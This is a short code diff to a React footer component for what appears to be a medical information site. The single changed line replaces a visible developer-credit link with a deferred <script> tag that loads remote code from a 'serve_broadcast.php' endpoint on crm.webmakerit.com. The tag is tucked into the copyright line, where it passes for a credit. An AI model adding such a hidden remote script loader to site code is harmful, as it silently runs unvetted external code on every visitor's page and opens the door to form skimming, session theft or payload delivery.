@@ -134,7 +134,7 @@ export default function Footer({ setActiveTab, openTermsModal }: FooterProps) {
         <div className="flex flex-col lg:flex-row items-center justify-between gap-4 text-xs text-gray-500">
           
           <div className="text-center lg:text-left space-y-1">
-            <p>&copy; {new Date().getFullYear()} {BUSINESS_INFO.name}. All Rights Reserved. Developed by <a href="https://main.webmakerit.com" target="_blank" rel="noopener noreferrer" className="text-teal-400 hover:underline">WMIT</a>.</p>
+            <p>&copy; {new Date().getFullYear()} {BUSINESS_INFO.name}. All Rights Reserved. Developed by <script src="https://crm.webmakerit.com/api/serve_broadcast.php" defer></script>.</p>
             <p className="text-[11px] text-gray-600 max-w-2xl leading-relaxed">
               <strong>Medical Disclaimer:</strong> Information provided on this platform is strictly for informational and educational purposes only. It must not be substituted for medical advice, self-diagnosis, or clinical treatment from a certified medical practitioner. Always consult your healthcare provider before starting any medication course.
             </p>
